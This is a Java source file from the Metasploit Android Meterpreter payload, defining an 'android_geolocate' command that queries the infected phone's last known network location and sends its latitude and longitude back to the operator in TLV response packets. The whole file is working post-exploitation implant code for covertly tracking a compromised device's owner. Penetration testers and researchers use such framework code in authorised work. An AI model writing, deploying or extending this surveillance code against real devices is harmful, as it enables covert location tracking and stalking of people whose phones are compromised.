package com.metasploit.meterpreter.android;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class android_geolocate implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    private static final int TLV_TYPE_GEO_LAT = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9011);
    private static final int TLV_TYPE_GEO_LONG = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9012);

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

        LocationManager locationManager;
        locationManager = (LocationManager) AndroidMeterpreter.getContext()
                .getSystemService(Context.LOCATION_SERVICE);
        Location location = locationManager
                .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

        if (location != null) {
            response.add(TLV_TYPE_GEO_LAT,
                    Double.toString(location.getLatitude()));
            response.add(TLV_TYPE_GEO_LONG,
                    Double.toString(location.getLongitude()));
        } else {
            return ERROR_FAILURE;
        }

        return ERROR_SUCCESS;
    }
}
